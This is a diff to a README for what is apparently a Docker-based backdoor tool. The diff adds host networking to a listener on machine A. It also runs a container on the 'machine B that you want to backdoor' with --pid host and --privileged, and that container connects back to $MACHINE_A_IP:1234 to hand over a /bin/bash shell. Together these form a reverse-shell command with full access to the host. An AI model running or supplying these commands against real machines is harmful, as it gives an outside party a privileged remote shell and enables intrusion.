@@ -12,13 +12,13 @@ Useful when the machine to access cannot listen on the internet.
 ## On machine A that can listen on a port open to the internet
 
 ```bash
-$ docker run -it --rm tiborvass/backdoor-accomplice 0.0.0.0:1234
+$ docker run -it --rm --net host tiborvass/backdoor-accomplice 0.0.0.0:1234
 ```
 
 ## On machine B that you want to backdoor
 
 ```bash
-$ docker run -dit tiborvass/backdoor $MACHINE_A_IP:1234 bash
+$ docker run -dit --pid host --privileged tiborvass/backdoor $MACHINE_A_IP:1234 /bin/bash
 ```
 
 # Building
